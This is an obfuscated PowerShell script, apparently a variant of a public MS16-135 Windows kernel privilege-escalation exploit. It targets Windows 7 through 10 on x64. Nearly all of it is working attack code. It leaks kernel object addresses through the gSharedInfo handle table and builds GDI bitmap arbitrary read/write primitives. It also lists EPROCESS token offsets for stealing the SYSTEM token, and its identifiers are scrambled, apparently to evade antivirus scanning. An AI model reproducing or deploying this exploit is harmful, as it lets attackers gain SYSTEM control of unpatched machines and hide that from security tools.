s`ET  ("{0}{1}" -f'2dKT','n9') ( [tyPE]("{1}{0}"-F 'dLL','Nt')  )  ;    ${W3u`9O}  = [TyPe]("{1}{0}{2}"-F 'At','sySteM.m','H') ;   seT-`Va`RIabLE  ("{1}{0}" -f'EC','hT') ([tYPE]("{3}{0}{1}{4}{2}"-F'REDInF','Ob','p','gShA','itmA')  )  ;    ${2`16}= [TYPe]("{3}{4}{5}{6}{1}{0}{2}"-F'e','ErT','R','Sy','STem.biTc','O','Nv');    S`V  ("{1}{0}"-f '1','rfE5')  ([TyPe]("{1}{0}{3}{2}"-f'MaPEl','Bit','AtE','Ev')  ) ;${1`Ms}  =[TyPE]("{2}{1}{0}"-F'i32','VaP','ad') ;   SET`-`Item ('V'+'aRIABLe:ta'+'5')  (  [tYPE]("{4}{0}{3}{6}{1}{5}{2}" -f 's','iPeS.P','IrEcTiOn','T','sY','IpED','em.IO.P')) ;   ${5`9Q} =  [TypE]("{1}{0}" -F'g','StrIN');    SET`-vAriA`BLe  ('N3'+'g')  ( [Type]("{1}{0}{3}{2}{4}"-f 'gNo','DIA','CS.sTopwA','STI','tcH')) ;   ${3alc`8O} = [TYpE]("{2}{4}{1}{3}{0}" -F 'r','i','syST','Ntpt','eM.')  ; ${5`CV}  = [tyPe]("{1}{2}{0}" -F 'Ptr','iN','T');  ${5`yV}  =  [tYpe]("{8}{10}{0}{2}{5}{6}{1}{3}{9}{4}{7}" -f'Ti','opsERV','Me.inT','i','Rs','E','R','HaL','SY','cEs.Ma','stem.rUN')  ;  ${K`498}=  [tYpe]("{2}{1}{0}" -f '35','1','MS16') ; function invO`K`e-M`s16135 {

    [CmdletBinding()]
    param(

        [Parameter(pOsitIoN=0,MANDAtory=${t`RUE})]
        [String]
        ${cOmM`A`Nd}
    )

	AD`D`-tYPE -TypeDefinition @"
	using System;
	using System.Diagnostics;
	using System.Runtime.InteropServices;
	using System.Security.Principal;

	[StructLayout(LayoutKind.Sequential)]
	public struct PROCESS_INFORMATION
	{
		public IntPtr hProcess;
		public IntPtr hThread;
		public int dwProcessId;
		public int dwThreadId;
	}

	[StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
	public struct STARTUPINFO
	{
		public Int32 cb;
		public string lpReserved;
		public string lpDesktop;
		public string lpTitle;
		public Int32 dwX;
		public Int32 dwY;
		public Int32 dwXSize;
		public Int32 dwYSize;
		public Int32 dwXCountChars;
		public Int32 dwYCountChars;
		public Int32 dwFillAttribute;
		public Int32 dwFlags;
		public Int16 wShowWindow;
		public Int16 cbReserved2;
		public IntPtr lpReserved2;
		public IntPtr hStdInput;
		public IntPtr hStdOutput;
		public IntPtr hStdError;
	}

	[StructLayout(LayoutKind.Sequential)]
	public struct SQOS
	{
		public int Length;
		public int ImpersonationLevel;
		public int ContextTrackingMode;
		public bool EffectiveOnly;
	}

	public static class Advapi32
	{
		[DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
		public static extern bool CreateProcessWithLogonW(
			String userName,
			String domain,
			String password,
			int logonFlags,
			String applicationName,
			String commandLine,
			int creationFlags,
			int environment,
			String currentDirectory,
			ref  STARTUPINFO startupInfo,
			out PROCESS_INFORMATION processInformation);
			
		[DllImport("advapi32.dll", SetLastError=true)]
		public static extern bool SetThreadToken(
			ref IntPtr Thread,
			IntPtr Token);
			
		[DllImport("advapi32.dll", SetLastError=true)]
		public static extern bool OpenThreadToken(
			IntPtr ThreadHandle,
			int DesiredAccess,
			bool OpenAsSelf,
			out IntPtr TokenHandle);
			
		[DllImport("advapi32.dll", SetLastError=true)]
		public static extern bool OpenProcessToken(
			IntPtr ProcessHandle, 
			int DesiredAccess,
			ref IntPtr TokenHandle);
			
		[DllImport("advapi32.dll", SetLastError=true)]
		public extern static bool DuplicateToken(
			IntPtr ExistingTokenHandle,
			int SECURITY_IMPERSONATION_LEVEL,
			ref IntPtr DuplicateTokenHandle);
	}

	public static class Kernel32
	{
		[DllImport("kernel32.dll")]
		public static extern uint GetLastError();

		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern IntPtr GetCurrentProcess();

		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern IntPtr GetCurrentThread();
		
		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern int GetThreadId(IntPtr hThread);
		
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern int GetProcessIdOfThread(IntPtr handle);
		
		[DllImport("kernel32.dll",SetLastError=true)]
		public static extern int SuspendThread(IntPtr hThread);
		
		[DllImport("kernel32.dll",SetLastError=true)]
		public static extern int ResumeThread(IntPtr hThread);
		
		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern bool TerminateProcess(
			IntPtr hProcess,
			uint uExitCode);

		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern bool CloseHandle(IntPtr hObject);
		
		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern bool DuplicateHandle(
			IntPtr hSourceProcessHandle,
			IntPtr hSourceHandle,
			IntPtr hTargetProcessHandle,
			ref IntPtr lpTargetHandle,
			int dwDesiredAccess,
			bool bInheritHandle,
			int dwOptions);
	}


	[StructLayout(LayoutKind.Sequential)]
	public struct INPUT
	{
		public int itype;
		public KEYBDINPUT U;
		public int Size;
	}

	[StructLayout(LayoutKind.Sequential)]
	public struct KEYBDINPUT
	{
		public UInt16 wVk;
		public UInt16 wScan;
		public uint dwFlags;
		public int time;
		public IntPtr dwExtraInfo;
	}

	[StructLayout(LayoutKind.Sequential)] 
	public struct tagMSG  
	{  
		public IntPtr hwnd;
		public UInt32 message;
		public UIntPtr wParam;
		public UIntPtr lParam;
		public UInt32 time;
		public POINT pt;
	}

	public struct POINT
	{  
		public Int32 x;
		public Int32 Y;
	}

	public class ms16135
	{
		delegate IntPtr WndProc(
			IntPtr hWnd,
			uint msg,
			IntPtr wParam,
			IntPtr lParam);

		[System.Runtime.InteropServices.StructLayout(LayoutKind.Sequential,CharSet=CharSet.Unicode)]
		struct WNDCLASSEX
		{
			public uint cbSize;
			public uint style;
			public IntPtr lpfnWndProc;
			public int cbClsExtra;
			public int cbWndExtra;
			public IntPtr hInstance;
			public IntPtr hIcon;
			public IntPtr hCursor;
			public IntPtr hbrBackground;
			[MarshalAs(UnmanagedType.LPWStr)]
			public string lpszMenuName;
			[MarshalAs(UnmanagedType.LPWStr)]
			public string lpszClassName;
			public IntPtr hIconSm;
		}
		
		[System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true)]
		static extern System.UInt16 RegisterClassW(
			[System.Runtime.InteropServices.In] ref WNDCLASSEX lpWndClass);

		[System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr CreateWindowExW(
			UInt32 dwExStyle,
			[MarshalAs(UnmanagedType.LPWStr)]
			string lpClassName,
			[MarshalAs(UnmanagedType.LPWStr)]
			string lpWindowName,
			UInt32 dwStyle,
			Int32 x,
			Int32 y,
			Int32 nWidth,
			Int32 nHeight,
			IntPtr hWndParent,
			IntPtr hMenu,
			IntPtr hInstance,
			IntPtr lpParam);

		[System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true)]
		static extern System.IntPtr DefWindowProcW(
			IntPtr hWnd,
			uint msg,
			IntPtr wParam,
			IntPtr lParam);

		[System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true)]
		public static extern bool DestroyWindow(
			IntPtr hWnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern bool UnregisterClass(
			String lpClassName,
			IntPtr hInstance);

		[System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
		public static extern IntPtr GetModuleHandleW(
			[MarshalAs(UnmanagedType.LPWStr)]
			String lpModuleName);

		[DllImport("user32.dll", EntryPoint="SetWindowLongPtr")]
		public static extern IntPtr SetWindowLongPtr(
			IntPtr hWnd,
			int nIndex,
			IntPtr dwNewLong);

		[DllImport("user32.dll")]
		public static extern bool ShowWindow(
			IntPtr hWnd,
			int nCmdShow);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(
			IntPtr hWndChild,
			IntPtr hWndNewParent);

		[DllImport("user32.dll", SetLastError = false)]
		public static extern IntPtr GetDesktopWindow();

		[DllImport("user32.dll")]
		public static extern bool SetForegroundWindow(
			IntPtr hWnd);

		[DllImport("user32.dll", SetLastError=true)]
		public static extern void SwitchToThisWindow(
			IntPtr hWnd,
			bool fAltTab);

		[DllImport("user32.dll")]
		public static extern bool GetMessage(
			out tagMSG lpMsg,
			IntPtr hWnd,
			uint wMsgFilterMin,
			uint wMsgFilterMax);

		[DllImport("user32.dll")]
		public static extern bool TranslateMessage(
			[In] ref tagMSG lpMsg);

		[DllImport("user32.dll")]
		public static extern IntPtr DispatchMessage(
			[In] ref tagMSG lpmsg);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetFocus(
			IntPtr hWnd);

		[DllImport("user32.dll")]
		public static extern uint SendInput(
			uint nInputs, 
			[In] INPUT pInputs, 
			int cbSize);

		[DllImport("gdi32.dll")]
		public static extern int GetBitmapBits(
			IntPtr hbmp,
			int cbBuffer,
			IntPtr lpvBits);

		[DllImport("gdi32.dll")]
		public static extern int SetBitmapBits(
			IntPtr hbmp,
			int cbBytes,
			IntPtr lpBits);

		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern IntPtr VirtualAlloc(
			IntPtr lpAddress,
			uint dwSize,
			UInt32 flAllocationType,
			UInt32 flProtect);

		public UInt16 CustomClass(string class_name)
		{
			m_wnd_proc_delegate = CustomWndProc;
			WNDCLASSEX wind_class = new WNDCLASSEX();
			wind_class.lpszClassName = class_name;
			///wind_class.cbSize = (uint)Marshal.SizeOf(wind_class);
			wind_class.lpfnWndProc = System.Runtime.InteropServices.Marshal.GetFunctionPointerForDelegate(m_wnd_proc_delegate);
			return RegisterClassW(ref wind_class);
		}

		private static IntPtr CustomWndProc(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam)
		{
			return DefWindowProcW(hWnd, msg, wParam, lParam);
		}

		private WndProc m_wnd_proc_delegate;
	}
"@


	${m`S16`135} = ((("{5}{58}{36}{14}{69}{60}{59}{50}{75}{18}{61}{1}{28}{9}{72}{22}{71}{32}{24}{15}{41}{25}{56}{66}{54}{52}{6}{42}{4}{64}{34}{49}{20}{17}{26}{7}{3}{68}{57}{74}{46}{30}{43}{55}{10}{63}{33}{12}{62}{13}{35}{70}{53}{19}{44}{47}{37}{21}{8}{40}{23}{39}{38}{27}{51}{16}{0}{31}{67}{11}{73}{48}{29}{45}{2}{65}{76}"-f' ',' ','uzzySe','_{0} ','0}','{1}
	 ','_','   {0}','}_','_ _','0}_',' ','{','___',' ','  __{',' ',' {0',' __','{0}',' {0} {0}','0','
','}_','0} ',' {0}','}__','		','__','b33f',' {0',' ',' {','{0}
	{0}_{0}_{0}_','0','{','___','}   {','{0}___{0}
			','__','____{0','0}_ ','  {','}','__',' -> @F',' .','_{0','[by ','}
	{0}','__','					
	       ','__{0}_  {0} {0}','__','}_','___{0}_{0} {0}_{0}_  {',' {0}  _{','0}','__','_ _','_','_     ___  ','0}__','  ','  _{','c]
					   
','0','       ','{','___','0}___','	{0}    ','__ ',' ','_{0}','  ','{1}')) -F  [chAr]124,[chAr]34)
	${ms1`6135}

	if (  ( VAr`I`ABlE  ("{0}{1}" -f'3alc','8o') -VAlUEOnl )::"sI`ze" -ne 8) {
		("`n[!] "+'Target'+' '+'ar'+'c'+'hitect'+'ur'+'e '+'is'+' '+'x64'+' '+"only!`n")
		Return
	}

	${o`sveRSi`ON} = [Version](g`eT-wMio`BJe`Ct ("{1}{2}{6}{5}{3}{0}{4}"-f's','Win','32_Opera','y','tem','ingS','t'))."VerSI`ON"
	${s`CriPt:O`sm`Ajormin`OR} = "$($OSVersion.Major).$($OSVersion.Minor)"
	switch (${oSM`AjO`Rm`in`Or})
	{
		("{0}{1}" -f '10','.0') 
		{
			WrIt`E-`VE`RbO`sE ("{3}{0}{1}{2}" -f ' Tar','get is ','Win 10','[?]')
			WriT`E-`Ve`R`BOsE ('['+'+] '+'Bitm'+'ap'+' '+'d'+'imen'+'sio'+'ns: '+"0x760*0x4`n")
		}

		'6.3' 
		{
			w`RI`Te-`VeRbosE ("{4}{3}{2}{0}{1}" -f'8.','1','is Win ','?] Target ','[')
			WRiTE`-VE`RBO`sE ('['+'+] '+'B'+'itma'+'p '+'d'+'imens'+'ions'+': '+"0x760*0x4`n")
		}

		'6.2' 
		{
			wriT`E`-Ve`RBOSe ("{3}{1}{0}{2}"-f' ',' Target is','Win 8','[?]')
			w`RiTE`-`V`eRboSe ('['+'+] '+'B'+'itmap'+' '+'di'+'men'+'sions: '+"0x760*0x4`n")
		}

		'6.1' 
		{
			W`RItE-V`eRBosE ("{3}{4}{1}{0}{2}" -f ' Win ','et is','7','[','?] Targ')
			wRiT`E-`VerBOSe ('[+'+'] '+'Bitma'+'p'+' '+'di'+'mensio'+'ns: '+"0x770*0x4`n")
		}
	}

	function GeT-L`OaDED`ModUl`ES {

		aDd`-tY`pe -TypeDefinition @"
		using System;
		using System.Diagnostics;
		using System.Runtime.InteropServices;
		using System.Security.Principal;

		[StructLayout(LayoutKind.Sequential, Pack = 1)]
		public struct SYSTEM_MODULE_INFORMATION
		{
			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
			public UIntPtr[] Reserved;
			public IntPtr ImageBase;
			public UInt32 ImageSize;
			public UInt32 Flags;
			public UInt16 LoadOrderIndex;
			public UInt16 InitOrderIndex;
			public UInt16 LoadCount;
			public UInt16 ModuleNameOffset;
			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 256)]
			internal Char[] _ImageName;
			public String ImageName {
				get {
					return new String(_ImageName).Split(new Char[] {'\0'}, 2)[0];
				}
			}
		}

		public static class Ntdll
		{
			[DllImport("ntdll.dll")]
			public static extern int NtQuerySystemInformation(
				int SystemInformationClass,
				IntPtr SystemInformation,
				int SystemInformationLength,
				ref int ReturnLength);
		}
"@

		[int]${b`UF`F`PT`R_sIzE} = 0
		while (${T`Rue}) {
			[IntPtr]${bu`FfP`TR} =   (C`Hi`LDiTEm ('VA'+'r'+'IAble:'+'5Yv'))."v`Alue"::("{2}{0}{1}"-f 'l','locHGlobal','A').Invoke(${bUfFp`Tr_`Si`ze})
			${sYsTEmIN`F`oR`mA`TI`Onl`E`Ngth} = Ne`w-oB`JE`cT ("{1}{0}"-f 'nt','I')
		
			${CalL`R`E`SuLt} =  (  vaRia`BlE ("{1}{0}"-f '9','2dKtn')  -VAlUeo  )::"nTQUEr`y`s`YsTEM`i`NFoR`MA`TioN"(11, ${BUF`FPTR}, ${bu`FfPt`R_SI`ZE}, [ref]${Sy`Ste`MIn`FO`Rm`ATiOnL`EN`gTH})
			
			if (${Ca`lLREs`ULT} -eq 0xC0000004) {
				  ( gEt`-VarI`ABLE ("{1}{0}" -f 'yV','5'))."V`Alue"::("{1}{0}{2}"-f 'ee','Fr','HGlobal').Invoke(${B`U`FfPTR})
				[int]${bufFpTR_`S`I`ze} =  (V`Ar`iabLE ("{1}{0}"-f'u9o','w3') )."vAl`UE"::("{1}{0}" -f'ax','M').Invoke(${buFf`Pt`R`_SIZE},${sY`stEMinFOrma`TIONl`e`NG`Th})
			}
			elseif (${cA`L`lresUlt} -eq 0x00000000) {
				break
			}
			else {
				 ( GEt-V`A`RiAb`Le  ('5Y'+'V') -VaLUEON  )::("{0}{1}{3}{2}"-f 'F','reeHGl','l','oba').Invoke(${b`UF`FPTR})
				return
			}
		}

		${SysTEm`_modu`LE_InFORma`Ti`On} = N`EW-oBje`Ct ("{1}{4}{5}{3}{0}{2}" -f'ATIO','SYST','N','RM','EM_MODU','LE_INFO')
		${S`ys`TEM_MODuL`e_INF`ORMAtiOn} = ${SYS`T`em_moDule`_Info`R`MatioN}.("{1}{0}" -f'e','GetTyp').Invoke()
		if (  (varI`Ab`le ("{1}{0}"-f 'Lc8O','3a') -vAlUEON  )::"Si`ze" -eq 4) {
			${s`ySTEm_`mOdU`LE_InforMA`TION`_S`IzE} = 284
		} else {
			${sYs`TEM_M`O`DU`lE_`i`NfORMaTIO`N_sIze} = 296
		}

		${Buff`Of`FSet} = ${B`Uf`Fptr}.("{0}{2}{1}" -f 'To','nt64','I').Invoke()
		${hA`Nd`LEcOUnt} =   (I`TeM ("vaRIA"+"Bl"+"E:5Y"+"V") )."val`Ue"::("{1}{0}" -f'eadInt32','R').Invoke(${bU`FfO`FFs`et})
		${BUf`Fo`Ff`sET} = ${BUFF`off`S`Et} +  (G`Et-VaRiAB`Le  ('3'+'Alc8'+'o') -VaLUEOnLY  )::"Si`Ze"

		${sY`stEMmOdUL`earR`AY} = @()
		for (${I}=0; ${i} -lt ${H`AnD`LECO`Unt}; ${I}++){
			${sy`ST`emPOi`NTeR} = NE`w-o`BjeCT ("{0}{3}{1}{2}"-f'Syste','In','tptr','m.') -ArgumentList ${bUffO`FfS`et}
			${c`AST} =  ${5`yV}::"pT`RtO`STru`ctUrE"(${SySte`mpo`InT`eR},[type]${sY`steM_m`oDu`le`_INF`ormATIoN})
			
			${H`As`HTabLE} = @{
				("{0}{2}{1}" -f 'Im','ame','ageN') = ${CA`St}."i`MA`g`ENAmE"
				("{2}{0}{1}" -f 'e','Base','Imag') = if (  ( iT`em  ("{1}{3}{4}{2}{0}" -f '3aLc8o','v','ABLE:','A','RI'))."Val`Ue"::"SI`ZE" -eq 4) {$(${C`Ast}."I`mAGE`BaSe").("{1}{0}" -f 'oInt32','T').Invoke()} else {$(${c`AsT}."ImaGE`B`Ase").("{1}{0}{2}" -f'Int6','To','4').Invoke()}
				("{2}{1}{0}"-f 'e','mageSiz','I') = "0x$('{0:X}' -f $Cast.ImageSize)"
			}
			
			${oB`jeCT} = nEw-`OB`jEct ("{2}{1}{0}"-f 'ect','SObj','P') -Property ${HAs`HtA`BLe}
			${sySt`EMMO`dU`lEA`Rr`AY} += ${o`BJECt}
		
			${BUF`FO`FfS`eT} = ${buf`Foff`sET} + ${sysTem_`mO`DULe_iNF`ORma`T`ioN`_si`ze}
		}

		${Sys`TE`mMod`U`l`eARraY}

		
		  (  It`em ("{1}{2}{0}" -f'e:5YV','v','aRIABl')  )."vAl`Ue"::("{0}{2}{1}" -f 'FreeHG','al','lob').Invoke(${b`UFf`pTR})
	}

	function stAg`e-`GS`haR`eDi`NfOBitM`Ap {

		adD`-`TYpE -TypeDefinition @"
		using System;
		using System.Diagnostics;
		using System.Runtime.InteropServices;
		using System.Security.Principal;

		public static class gSharedInfoBitmap
		{
			[DllImport("gdi32.dll")]
			public static extern IntPtr CreateBitmap(
				int nWidth,
				int nHeight,
				uint cPlanes,
				uint cBitsPerPel,
				IntPtr lpvBits);

			[DllImport("kernel32", SetLastError=true, CharSet = CharSet.Ansi)]
			public static extern IntPtr LoadLibrary(
				string lpFileName);
			
			[DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
			public static extern IntPtr GetProcAddress(
				IntPtr hModule,
				string procName);

			[DllImport("user32.dll")]
			public static extern IntPtr CreateAcceleratorTable(
				IntPtr lpaccl,
				int cEntries);

			[DllImport("user32.dll")]
			public static extern bool DestroyAcceleratorTable(
				IntPtr hAccel);
		}
"@

		if (  ${3`AlC`8o}::"s`izE" -eq 4) {
			${X`32} = 1
		}

		function cReAt`E-acCe`Le`RAt`oRT`A`BLe {
			[IntPtr]${bu`FFeR} =   ( g`Ci ("{3}{0}{2}{1}"-f 'l','yv','E:5','vArIab') )."V`AluE"::("{2}{1}{0}" -f 'al','Glob','AllocH').Invoke(10000)
			${AcCE`l`HAN`dle} =  ( vA`R`iABlE  ("HT"+"ec") )."va`Lue"::("{1}{4}{5}{3}{0}{6}{2}"-f'ra','C','orTable','e','reateAc','cel','t').Invoke(${bu`F`FEr}, 700) 
			${US`e`R32hA`NLe} =  (Ls  ("{2}{3}{1}{0}" -f 'Htec','bLe:','vAR','ia'))."vA`lUE"::("{0}{2}{3}{1}"-f'Load','rary','L','ib').Invoke(("{0}{2}{1}"-f'u','er32.dll','s'))
			${Gsha`Re`DInfo} =  (D`iR  ("{1}{0}{2}" -f ':h','vaRiAbLE','TEc') )."V`AlUE"::("{3}{1}{0}{2}"-f 'dd','A','ress','GetProc').Invoke(${UseR32h`An`le}, ("{1}{2}{0}" -f'aredInfo','g','Sh'))
			if (${x`32}){
				${gs`hA`RedIN`Fo} = ${GSHA`Re`di`Nfo}.("{0}{1}"-f'ToI','nt32').Invoke()
			} else {
				${g`SHAr`EDIN`Fo} = ${gSh`Ar`EdI`Nfo}.("{1}{2}{0}"-f'64','ToIn','t').Invoke()
			}
			${ahe`li`st} = ${gsHAR`eD`iN`FO} +  ${3a`l`C8o}::"SI`Ze"
			if (${X`32}){
				${AHe`lIst} =   ${5`Yv}::("{2}{1}{0}" -f 'Int32','ad','Re').Invoke(${ah`eLIST})
				${h`ANdlE`e`NTRY} = ${Ah`ELi`sT} + ([int]${aCcelha`N`dle} -band 0xffff)*0xc 
				${phE`AD} =  ( g`I  ("{3}{0}{1}{2}"-f 'A','Riab','LE:5yV','V')  )."v`Alue"::("{0}{2}{1}" -f'ReadIn','2','t3').Invoke(${hAN`DLee`NT`RY})
			} else {
				${aHeL`i`sT} =  (  g`ET-`VariA`BLe  ("5"+"yV") )."v`ALue"::("{1}{2}{0}" -f'4','ReadIn','t6').Invoke(${AHeL`IST})
				${H`A`Ndl`eENTRY} = ${aH`E`LiST} + ([int]${Acce`LHAND`Le} -band 0xffff)*0x18 
				${P`head} =  ${5`yV}::("{1}{0}" -f 'Int64','Read').Invoke(${Han`dl`e`eNTrY})
			}

			${RE`suLt} = @()
			${HA`shtaB`LE} = @{
				("{2}{1}{0}"-f 'e','l','Hand') = ${aCCeL`Ha`Nd`LE}
				("{1}{0}{2}" -f 'e','Kern','lObj') = ${pHE`AD}
			}
			${OB`jE`CT} = new-O`B`jeCT ("{0}{1}" -f'PSObj','ect') -Property ${HaS`hTAB`le}
			${r`E`suLt} += ${ObJ`eCT}
			${R`eS`UlT}
		}

		function DEs`T`R`OY-A`CC`el`eRatORtaBlE {
			param (${ha`N`lDE})
			${cA`llR`esult} =  (  C`Hi`LdIteM  ("{0}{1}{2}{3}" -f'V','aRia','Bl','E:htEc'))."vAL`UE"::("{6}{2}{0}{3}{1}{5}{4}"-f 'tr','el','es','oyAcc','rTable','erato','D').Invoke(${HA`NL`De})
		}

		${kerNeL`A`R`Ray} = @()
		for (${i}=0;${i} -lt 20;${I}++) {
			${K`ERneL`A`RRay} += c`R`EAte-acceL`e`RAt`ORTa`Ble
			if (${keRN`eL`A`RRay}."Len`g`TH" -gt 1) {
				if (${K`e`RN`eLarrAY}[${i}]."K`ERn`eLObj" -eq ${k`e`R`NelaRRaY}[${i}-1]."kE`RNeLo`BJ") {
					D`E`S`TR`OY-`AccEleRa`TORTAbLe -Hanlde ${k`ER`N`elaRray}[${i}]."haN`d`le"
					[IntPtr]${b`UFF`er} =   ${5`yv}::("{0}{1}{2}{3}"-f'AllocH','Gl','ob','al').Invoke(0x50*2*4)
					if (${OSMaJ`Or`Mi`N`Or} -eq "6.1") { 
						${BI`TmaPH`AN`DlE} =  (G`et-`VarIa`BLE  ('HT'+'EC')  -VaLuEON )::("{2}{1}{0}"-f 'itmap','eateB','Cr').Invoke(0x770, 4, 1, 8, ${bu`FFER}) 
					} else {
						${bItma`PhA`N`DLe} =  (ChI`Ldit`EM  ("{0}{1}{2}" -f'VAr','IABLE',':Htec')  )."VAL`UE"::("{0}{3}{1}{2}" -f'C','te','Bitmap','rea').Invoke(0x760, 4, 1, 8, ${buF`F`Er}) 
					}
					break
				}
			}
			D`es`TroY-AcCeleratorT`Ab`le -Hanlde ${Ke`R`NELArr`Ay}[${I}]."H`ANDle"
		}

		${bI`T`mAPOb`JECt} = @()
		${hAsh`Ta`Ble} = @{
			("{2}{1}{0}" -f'ndle','pHa','Bitma') = ${b`It`Ma`pHANdLe}
			("{2}{3}{1}{0}" -f 'Obj','Kernel','Bitm','ap') = $(${KErNElA`RR`Ay}[${i}]."KERN`El`oBj")
			("{2}{4}{3}{1}{0}" -f'0','n','B','vSca','itmapp') = if (${x`32}) {$(${KErNELA`Rr`Ay}[${i}]."k`ErN`elOBJ") + 0x32} else {$(${ke`Rn`ElarRAy}[${I}]."k`eRneL`OBJ") + 0x50}
		}
		${OBj`E`CT} = n`Ew-O`BJe`CT ("{1}{0}" -f'bject','PSO') -Property ${ha`sH`Ta`Ble}
		${BItmA`P`o`BjecT} += ${ob`J`ECt}
		${b`itMAp`oB`jEct}
	}

	function B`I`Tmap-El`EVAtE {
		param([IntPtr]${MA`NAG`e`R`BITmAp},[IntPtr]${WO`R`kerBI`T`mAP})

		ADD-T`Y`pe -TypeDefinition @"
		using System;
		using System.Diagnostics;
		using System.Runtime.InteropServices;
		using System.Security.Principal;
		public static class BitmapElevate
		{
			[DllImport("gdi32.dll")]
			public static extern int SetBitmapBits(
				IntPtr hbmp,
				uint cBytes,
				byte[] lpBits);
			[DllImport("gdi32.dll")]
			public static extern int GetBitmapBits(
				IntPtr hbmp,
				int cbBuffer,
				IntPtr lpvBits);
			[DllImport("kernel32.dll", SetLastError = true)]
			public static extern IntPtr VirtualAlloc(
				IntPtr lpAddress,
				uint dwSize,
				UInt32 flAllocationType,
				UInt32 flProtect);
			[DllImport("kernel32.dll", SetLastError=true)]
			public static extern bool VirtualFree(
				IntPtr lpAddress,
				uint dwSize,
				uint dwFreeType);
			[DllImport("kernel32.dll", SetLastError=true)]
			public static extern bool FreeLibrary(
				IntPtr hModule);
			[DllImport("kernel32", SetLastError=true, CharSet = CharSet.Ansi)]
			public static extern IntPtr LoadLibrary(
				string lpFileName);
			[DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
			public static extern IntPtr GetProcAddress(
				IntPtr hModule,
				string procName);
		}
"@

		function BIt`MAp`-r`eAd {
			param (${Ad`D`ReSS})
			${Ca`LLre`Su`Lt} =  ( gE`T-var`iAB`LE  ("{1}{0}" -f 'E51','Rf')  -VaLUEonlY  )::("{0}{2}{1}{3}" -f 'S','apBit','etBitm','s').Invoke(${m`A`N`AGErbiTmAP},  (gET-it`eM  ('V'+'aR'+'IABlE:3Al'+'c8O')  )."vA`Lue"::"s`Ize",   (  LS ("{0}{2}{1}"-f 'VAr','ablE:216','I'))."vAL`Ue"::("{1}{2}{0}"-f 'tes','Ge','tBy').Invoke(${a`D`DReSS}))
			[IntPtr]${PO`iN`Ter} =   (  D`Ir ("vARiabL"+"e:"+"r"+"fe51"))."val`UE"::("{2}{1}{0}{3}" -f'll','rtualA','Vi','oc').Invoke(  ${3`A`Lc8o}::"z`eRO",   (vaRi`AB`lE ("3AlC"+"8o"))."vAL`Ue"::"sI`zE", 0x3000, 0x40)
			${CAL`lReSu`LT} =  ( gEt-v`Ar`I`ABLe ("{1}{0}" -f 'FE51','r') )."Va`lUe"::("{3}{0}{1}{2}"-f 'etBi','tma','pBits','G').Invoke(${WoRKeRbI`TM`Ap},   ( gET-V`A`RiABLe ("{1}{0}"-f'o','3AlC8')  -VALUe)::"S`IzE", ${POI`N`TEr})
			if (${X`32`ARC`hi`TEctUre}){
				 ${5`yV}::("{1}{0}{2}"-f't','ReadIn','32').Invoke(${Po`iN`TeR})
			} else {
				 (g`eT`-va`RIABLE ("5"+"Yv")  -vAlUeOnL )::("{0}{1}{2}"-f'ReadI','nt','64').Invoke(${poI`Nt`Er})
			}
			${C`AlL`R`esUlT} =  ${RF`E`51}::("{2}{1}{0}{3}"-f'F','tual','Vir','ree').Invoke(${pOI`N`TER},   ${3`Alc8o}::"s`IZE", 0x8000)
		}
		
		function Bit`mAp-Wr`iTE {
			param (${A`DD`RESS}, ${vA`L`Ue})
			${cAL`LresU`lT} =   (  GeT-`Vari`Ab`LE  ('Rf'+'E51') )."Val`UE"::("{3}{0}{1}{2}"-f 'itma','pBi','ts','SetB').Invoke(${mA`NAge`RBI`TmAP},   (D`Ir  ('v'+'A'+'rIablE:'+'3ALC'+'8o') )."V`AlUE"::"s`IzE",  ${2`16}::("{2}{0}{1}" -f'yte','s','GetB').Invoke(${A`dDr`ess}))
			${C`ALLRES`ULt} =   ${R`F`e51}::("{2}{1}{0}{3}" -f'BitmapB','et','S','its').Invoke(${worK`eRb`itMaP},  (  GET-VAr`iAb`lE  ('3'+'AlC8'+'o') )."v`ALue"::"si`zE",  (geT`-ITEM ('vAR'+'i'+'AB'+'LE:216'))."VA`lUE"::("{2}{1}{0}"-f 's','te','GetBy').Invoke(${vAL`UE}))
		}

		switch (${osmAJ`oRMi`N`oR})
		{
			("{0}{1}" -f'10','.0') 
			{
				${uN`IqU`EP`ROCeSs`iDOf`Fs`et} = 0x2e8
				${Tok`eNOF`FSET} = 0x358          
				${Act`i`VeP`R`OcEsSlI`Nks} = 0x2f0
			}
		
			'6.3' 
			{
				${uNIQUe`PR`Oc`eSS`I`do`FfseT} = 0x2e0
				${ToKE`NoF`FSEt} = 0x348          
				${ACtIv`ePR`OCe`Ssl`in`ks} = 0x2e8
			}
		
			'6.2' 
			{
				${U`N`Iq`UEProc`eS`s`idoffSeT} = 0x2e0
				${tokE`NOFFS`Et} = 0x348          
				${aCtI`VePROcES`s`li`Nks} = 0x2e8
			}
		
			'6.1' 
			{
				${uNIqUEPr`oc`e`S`s`IdOffset} = 0x180
				${t`okEN`of`FsEt} = 0x208          
				${a`cTIv`e`prOces`SlI`NkS} = 0x188
			}
		}
		
		W`RITe-Ver`Bo`se ("`n[>] "+'Lea'+'ki'+'ng '+'S'+'YSTEM'+' '+'_EP'+'ROCE'+'SS..')
